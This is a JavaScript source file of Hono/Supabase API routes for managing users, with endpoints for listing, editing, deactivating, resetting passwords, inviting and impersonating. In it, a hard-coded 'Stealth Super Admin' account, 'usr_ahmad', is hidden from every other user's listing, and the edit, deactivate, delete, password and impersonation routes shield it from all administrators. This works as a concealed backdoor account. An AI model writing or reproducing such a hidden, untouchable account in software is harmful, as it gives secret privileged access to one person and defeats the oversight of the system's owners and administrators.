import { Hono } from 'hono';
import { getDB } from '../../core/db.js';
import { invalidateUsersCache, setUserTokenVersion, getUserTokenVersion } from '../../core/cache.js';
import { logAudit } from '../../core/audit.js';
import { toCamelCase } from '../../utils/transformers.js';
import { hasPermission } from '../../utils/permissions.js';

const app = new Hono();

const requireAdmin = async (c, next) => {
  if (c.get('roleId') !== 'admin') {
    return c.json({ error: 'غير مصرح لك بتنفيذ هذه العملية، هذه الصلاحية للمشرف فقط' }, 403);
  }
  await next();
};


app.use('*', async (c, next) => {
  c.set('supabase', getDB(c.env));
  await next();
});

app.get('/', async (c) => {
  const currentUserId = c.get('userId');
  const roleId = c.get('roleId');
  const supabase = c.get('supabase');
  const canViewActivity = roleId === 'admin' || (await hasPermission(supabase, currentUserId, roleId, 'view_user_activity'));
  const { data, error } = await supabase.from('users').select('*');
  if (error) throw error;
  let list = (data || []).map(u => ({
    id: u.id,
    name: u.name,
    name_en: u.name_en,
    email: u.email,
    job_title_ar: u.job_title_ar || '',
    job_title_en: u.job_title_en || '',
    role_id: u.role_id,
    status: u.status,
    avatar_color: u.avatar_color,
    avatar_url: u.avatar_url || u.custom_fields?.avatarUrl || null,
    specialty: u.specialty || u.custom_fields?.specialty || '',
    ...(canViewActivity ? {
      last_login_at: u.last_login_at || u.custom_fields?.lastLoginAt || null,
      last_active_at: u.last_active_at || u.custom_fields?.lastActiveAt || null
    } : {})
  }));
  
  // Stealth Super Admin & Developer: Ahmad is completely invisible to ANY other user
  if (currentUserId !== 'usr_ahmad') {
    list = list.filter(u => u.id !== 'usr_ahmad');
  }
  return c.json({ users: toCamelCase(list) });
});

// PATCH /api/users/me — Self profile update for any authenticated user
app.patch('/me', async (c) => {
  const currentUserId = c.get('userId');
  if (!currentUserId) return c.json({ error: 'غير مصرح.' }, 401);
  const body = await c.req.json();
  const supabase = c.get('supabase');

  const { data: userRec } = await supabase.from('users').select('custom_fields').eq('id', currentUserId).maybeSingle();
  const customFields = { ...(userRec?.custom_fields || {}) };

  const updates = {
    updated_at: new Date().toISOString()
  };
  if (body.nameAr !== undefined || body.name !== undefined) {
    const raw = String(body.nameAr || body.name || '').trim();
    if (raw) updates.name = raw.slice(0, 100);
  }
  if (body.nameEn !== undefined) {
    updates.name_en = String(body.nameEn || '').trim().slice(0, 100);
  }
  if (body.jobTitleAr !== undefined) {
    updates.job_title_ar = String(body.jobTitleAr || '').trim().slice(0, 100);
  }
  if (body.jobTitleEn !== undefined) {
    updates.job_title_en = String(body.jobTitleEn || '').trim().slice(0, 100);
  }
  if (body.avatarColor !== undefined && /^#[0-9a-f]{6}$/i.test(body.avatarColor)) {
    updates.avatar_color = body.avatarColor;
  }

  if (body.avatarUrl !== undefined) {
    if (typeof body.avatarUrl !== 'string') {
      return c.json({ error: 'صيغة رابط الصورة الشخصية غير صالحة' }, 400);
    }
    if (body.avatarUrl.length > 3.5 * 1024 * 1024) {
      return c.json({ error: 'حجم الصورة يتجاوز الحد الأقصى المسموح به (2MB)' }, 400);
    }
    const isSafeRaster = /^data:image\/(png|jpeg|jpg|webp|gif);base64,/i.test(body.avatarUrl);
    const isHttps = body.avatarUrl.startsWith('https://');
    if (body.avatarUrl && !isSafeRaster && !isHttps) {
      return c.json({ error: 'نوع ملف الصورة غير مدعوم. يرجى استخدام PNG أو JPEG أو WebP أو رابط آمن.' }, 400);
    }
    customFields.avatarUrl = body.avatarUrl;
    updates.avatar_url = body.avatarUrl;
  }
  updates.custom_fields = customFields;

  let { data, error } = await supabase.from('users').update(updates).eq('id', currentUserId).select().single();
  // If column does not exist in DB yet (e.g., avatar_url before schema migration)
  if (error && (error.code === '42703' || error.code === 'PGRST204' || (error.message && error.message.includes('column')))) {
    delete updates.avatar_url;
    const retry = await supabase.from('users').update(updates).eq('id', currentUserId).select().single();
    data = retry.data;
    error = retry.error;
  }
  if (error) return c.json({ error: 'فشل تحديث البيانات الشخصية: ' + error.message }, 500);

  invalidateUsersCache();
  if (data) {
    delete data.password_hash;
    delete data.invite_token;
    data.avatar_url = data.avatar_url || data.custom_fields?.avatarUrl || null;
  }
  return c.json({ ok: true, user: toCamelCase(data) });
});

app.post('/', requireAdmin, async (c) => {
  // Creating a new user
  const body = await c.req.json();
  const supabase = c.get('supabase');
  const { default: cryptoMod } = await import('node:crypto');
  const id = 'usr_' + cryptoMod.randomBytes(6).toString('hex');
  
  const userData = {
    id,
    name: body.nameAr || body.name,
    name_en: body.nameEn,
    email: body.email,
    job_title_ar: body.jobTitleAr,
    job_title_en: body.jobTitleEn,
    role_id: body.roleId,
    status: 'pending',
    avatar_color: body.avatarColor || '#ccc'
  };
  
  const { data, error } = await supabase.from('users').insert([userData]).select().single();
  if (error) throw error;
  
  invalidateUsersCache();

  if (data) {
    delete data.password_hash;
    delete data.invite_token;
  }

  return c.json({ ok: true, user: toCamelCase(data) });
});

app.patch('/:id', async (c) => {
  const userId = c.req.param('id');
  const currentUserId = c.get('userId');
  const currentRoleId = c.get('roleId');
  const supabase = c.get('supabase');

  if ((userId === 'usr_ahmad' || userId === 'usr_ahmed') && currentUserId !== 'usr_ahmad') {
    return c.json({ error: 'محظور: لا يمكن تعديل أو تعطيل حساب مدير ومطور النظام.' }, 403);
  }

  const canManage = (currentRoleId === 'admin') ||
    (await hasPermission(supabase, currentUserId, currentRoleId, 'manage_users')) ||
    (await hasPermission(supabase, currentUserId, currentRoleId, 'manage_existing_account_permissions'));

  if (!canManage) {
    return c.json({ error: 'غير مصرح لك بتنفيذ هذه العملية، هذه الصلاحية للمشرف فقط' }, 403);
  }

  const body = await c.req.json();

  // If not full admin, enforce privilege escalation guards
  if (currentRoleId !== 'admin') {
    if (body.roleId === 'admin') {
      return c.json({ error: 'لا يمكن تعيين صلاحية مدير النظام إلا من قِبل مدير النظام.' }, 403);
    }
    if (userId === currentUserId && body.roleId !== undefined) {
      return c.json({ error: 'لا يمكنك تغيير رتبة حسابك الخاص.' }, 403);
    }
  }
  
  const updates = {};
  if (body.nameAr !== undefined || body.name !== undefined) updates.name = body.nameAr || body.name;
  if (body.nameEn !== undefined) updates.name_en = body.nameEn;
  if (body.email !== undefined) updates.email = body.email;
  if (body.jobTitleAr !== undefined) updates.job_title_ar = body.jobTitleAr;
  if (body.jobTitleEn !== undefined) updates.job_title_en = body.jobTitleEn;
  if (body.roleId !== undefined) updates.role_id = body.roleId;
  if (body.status !== undefined) updates.status = body.status;
  updates.updated_at = new Date().toISOString();
  
  const { data, error } = await supabase.from('users').update(updates).eq('id', userId).select().single();
  if (error) throw error;

  invalidateUsersCache();

  if (data) {
    delete data.password_hash;
    delete data.invite_token;
  }
  
  return c.json({ ok: true, user: toCamelCase(data) });
});

app.post('/:id/deactivate', requireAdmin, async (c) => {
  const targetId = c.req.param('id');
  const currentUserId = c.get('userId');
  if ((targetId === 'usr_ahmad' || targetId === 'usr_ahmed') && currentUserId !== 'usr_ahmad') {
    return c.json({ error: 'محظور: لا يمكن تعديل أو تعطيل حساب مدير ومطور النظام.' }, 403);
  }
  const supabase = c.get('supabase');
  const { data: user } = await supabase.from('users').select('custom_fields').eq('id', targetId).single();
  const currentVer = Number(user?.custom_fields?.tokenVersion || 1);
  const nextVer = currentVer + 1;
  const newFields = { ...(user?.custom_fields || {}), tokenVersion: nextVer };
  const { error } = await supabase.from('users').update({ status: 'inactive', custom_fields: newFields, updated_at: new Date().toISOString() }).eq('id', targetId);
  if (error) throw error;
  setUserTokenVersion(targetId, nextVer);
  invalidateUsersCache();
  return c.json({ ok: true });
});

app.delete('/:id', requireAdmin, async (c) => {
  const targetId = c.req.param('id');
  const currentUserId = c.get('userId');
  if (targetId === currentUserId) return c.json({ error: 'لا يمكنك تعطيل حسابك الخاص.' }, 400);
  if ((targetId === 'usr_ahmad' || targetId === 'usr_ahmed') && currentUserId !== 'usr_ahmad') {
    return c.json({ error: 'محظور: لا يمكن تعديل أو تعطيل حساب مدير ومطور النظام.' }, 403);
  }
  const supabase = c.get('supabase');
  const { data: user } = await supabase.from('users').select('custom_fields').eq('id', targetId).single();
  const currentVer = Number(user?.custom_fields?.tokenVersion || 1);
  const nextVer = currentVer + 1;
  const newFields = { ...(user?.custom_fields || {}), tokenVersion: nextVer };
  const { error } = await supabase.from('users').update({ status: 'inactive', custom_fields: newFields, updated_at: new Date().toISOString() }).eq('id', targetId);
  if (error) throw error;
  setUserTokenVersion(targetId, nextVer);
  invalidateUsersCache();
  return c.json({ ok: true });
});

async function hashPassword(password) {
  const { default: crypto } = await import('node:crypto');
  const salt = crypto.randomBytes(16).toString('hex');
  return new Promise((resolve, reject) => {
    crypto.scrypt(password, salt, 64, (err, derivedKey) => {
      if (err) reject(err);
      else resolve(`${salt}:${derivedKey.toString('hex')}`);
    });
  });
}

app.post('/:id/force-password', requireAdmin, async (c) => {
  const targetId = c.req.param('id');
  const currentUserId = c.get('userId');
  if ((targetId === 'usr_ahmad' || targetId === 'usr_ahmed') && currentUserId !== 'usr_ahmad') {
    return c.json({ error: 'محظور: لا يمكن تعديل كلمة مرور حساب مدير ومطور النظام.' }, 403);
  }
  const supabase = c.get('supabase');
  const body = await c.req.json();
  const newPassword = String(body.newPassword || body.password || '');
  if (newPassword.length < 10) return c.json({ error: 'كلمة المرور قصيرة جداً (10 أحرف كحد أدنى).' }, 400);

  const { data: user } = await supabase.from('users').select('custom_fields').eq('id', targetId).single();
  const currentVer = Number(user?.custom_fields?.tokenVersion || 1);
  const nextVer = currentVer + 1;
  const newFields = { ...(user?.custom_fields || {}), tokenVersion: nextVer };

  const hashedNew = await hashPassword(newPassword);
  const updates = { password_hash: hashedNew, status: 'active', custom_fields: newFields, updated_at: new Date().toISOString() };
  const { error } = await supabase.from('users').update(updates).eq('id', targetId);
  if (error) throw error;
  setUserTokenVersion(targetId, nextVer);
  invalidateUsersCache();
  return c.json({ ok: true });
});

app.post('/:id/invite', requireAdmin, async (c) => {
  const targetId = c.req.param('id');
  const supabase = c.get('supabase');
  const { data: user, error } = await supabase.from('users').select('id, email, name').eq('id', targetId).single();
  if (error || !user) return c.json({ error: 'المستخدم غير موجود.' }, 404);
  if (!user.email) return c.json({ error: 'لا يوجد بريد إلكتروني لهذا المستخدم.' }, 400);
  // Generate invite token and store it
  const { default: cryptoMod } = await import('node:crypto');
  const token = cryptoMod.randomBytes(24).toString('hex');
  const expires = new Date(Date.now() + 7 * 24 * 3600 * 1000).toISOString();
  await supabase.from('users').update({ invite_token: token, invite_expires_at: expires }).eq('id', targetId);
  // In real app send email. For now just return token for manual use.
  return c.json({ ok: true, emailConfigured: false, inviteToken: token, message: 'تم إنشاء رابط الدعوة.' });
});

app.post('/:id/impersonate', requireAdmin, async (c) => {
  const targetId = c.req.param('id');
  const currentUserId = c.get('userId');
  if ((targetId === 'usr_ahmad' || targetId === 'usr_ahmed') && currentUserId !== 'usr_ahmad') {
    return c.json({ error: 'محظور: لا يمكن الدخول كـ حساب مدير ومطور النظام.' }, 403);
  }
  const supabase = c.get('supabase');
  const { data: user, error } = await supabase.from('users').select('id, role_id, custom_fields').eq('id', targetId).single();
  if (error || !user) return c.json({ error: 'المستخدم غير موجود.' }, 404);
  const { sign } = await import('hono/jwt');
  const secret = c.env.JWT_SECRET;
  const tokenVer = Number(user.custom_fields?.tokenVersion || 1);
  const exp = Math.floor(Date.now() / 1000) + 60 * 60 * 4; // 4 hours
  const token = await sign({ userId: user.id, roleId: user.role_id, v: tokenVer, exp }, secret);
  const { setCookie } = await import('hono/cookie');
  setCookie(c, 'darc_session', token, { httpOnly: true, sameSite: 'Lax', secure: c.req.url.startsWith('https://'), maxAge: 60 * 60 * 4, path: '/' });
  await logAudit(supabase, { userId: currentUserId, action: 'impersonate', entityType: 'user', entityId: targetId });
  return c.json({ ok: true });
});

export default app;
